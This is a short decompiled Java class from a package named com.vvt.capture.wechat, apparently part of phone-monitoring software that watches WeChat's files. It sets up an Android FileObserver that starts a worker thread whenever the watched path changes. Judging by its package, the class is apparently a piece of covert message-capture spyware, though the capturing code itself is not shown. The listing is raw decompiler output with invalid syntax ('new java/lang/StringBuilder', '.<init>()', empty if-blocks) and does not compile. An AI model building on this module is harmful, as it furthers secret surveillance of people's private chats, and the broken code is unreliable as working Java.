package com.vvt.capture.wechat.a;

import android.os.FileObserver;

class d extends FileObserver {
  private Thread b = null;
  private String c = null;
  
  public d(b paramb, String paramString) {
    super(paramString, 2);
    this.c = paramString;
  }
  
  public void onEvent(int paramInt, String paramString) {
    boolean bool = b.a();
    if (bool) {}
    if (this.b == null) {
      e locale = new com.vvt.capture.wechat.a.e(this);
      this.b = new java.lang.Thread(locale);
      this.b.start();
    }
    bool = b.a();
    if (bool) {}
  }
  
  public String toString() {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder = localStringBuilder.append("FxFileObserverWorker[");
    String str = this.c;
    return str + "]";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */